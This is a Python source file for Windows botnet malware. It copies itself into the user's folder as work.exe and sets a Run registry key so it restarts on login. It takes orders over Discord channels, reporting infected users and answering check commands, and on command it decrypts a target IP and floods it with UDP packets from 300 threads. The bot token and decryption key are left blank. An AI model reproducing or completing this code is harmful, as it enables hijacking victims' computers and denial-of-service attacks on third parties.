import time
import socket
import threading
import time
import random
import rsa
import sys
import discord
import getpass
import winreg as reg
import os
from shutil import copyfile


p = sys.path[0]
app = sys.argv[0].split("\\")[-1]
user = getpass.getuser()
client = discord.Client()




class vova156dwa:
    def __init__(self,ip,time,threads=300):
        self.ip = ip
        self.port = 80
        self.threads = threads
        self.time=int(time)
        self.WORK = True

    def count_time(self):
        time.sleep(self.time)
        self.WORK=False

    
    def blank(self):
        while self.WORK:
            try:
                s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                data = random._urandom(1024)
                s.sendto(data,(self.ip,self.port))

            except:
                exit(1)
        
    def start_thread(self):
        for i in range(self.threads):
            t = threading.Thread(target=self.blank,daemon=True)
            t.start()
            
        
        threading.Thread(target=self.count_time())
    



def get_ip(msg):
    try:
        pri = rsa.PrivateKey()
        msg = msg.encode().decode('unicode_escape').encode("raw_unicode_escape")
        ip = rsa.decrypt(msg,pri).decode()
        return ip
    except: return 1
def dis():
    @client.event
    async def on_ready():
        try:
            ch = client.get_channel(917419368869134416)
            async for msg in ch.history(limit=200):
                content = msg.content
                if content == fr"Online {user}":
                    await msg.delete()
                
            await ch.send(f"Online {user}")
        except:
            pass

    

    @client.event
    async def on_message(msg):
        try:
            check_ch = client.get_channel(918194467113168947)
            ch = client.get_channel(917432306300502066)
            if msg.channel == check_ch:
                if msg.content == ".check":
                    await msg.delete()
                    await check_ch.send(f"#Here {user}")
            if msg.content.startswith("."):
                msg = msg.content
                msg = msg.split("  ")
                ip = msg[1]
                ip = get_ip(ip)
                if ip != 1:
                    x = vova156dwa(ip,msg[-1])
                    x.start_thread()
                    await ch.send(f"Started {user}")
        except Exception as e: pass
    
    client.run("")
    


          
def startup(path):
        try:
            
            key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
            open = reg.OpenKey(reg.HKEY_CURRENT_USER,key_value,0,reg.KEY_ALL_ACCESS)
            reg.SetValueEx(open,"win",0,reg.REG_SZ,"")
            reg.SetValueEx(open,"win",0,reg.REG_SZ,path)
            reg.CloseKey(open)  
           
        except:
            pass

while True:
    try:
        
        
        if fr"{p}\{app}" == fr"C:\Users\{user}\work.exe":
            t = threading.Thread(target=dis(),daemon=True).start()
        else:
            global final
            final = fr"C:\Users\{user}\work.exe"
            if os.path.isfile(final) is True:
                break
            else:
                copyfile(fr"{p}\{app}",final)
                startup(fr"C:\Users\{user}\work.exe")
                break
        
                
        
    except Exception as e:
            pass
        
    
        
    
